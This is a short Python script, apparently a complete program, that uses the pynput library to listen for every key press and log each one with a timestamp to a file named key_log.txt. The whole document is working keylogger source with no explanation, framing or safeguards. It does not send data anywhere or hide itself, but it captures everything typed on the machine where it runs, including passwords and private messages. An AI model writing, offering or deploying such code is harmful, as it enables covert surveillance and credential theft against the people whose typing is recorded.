from pynput.keyboard import Listener
import logging

logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
Listener(on_press=lambda key: logging.info(str(key))).join()
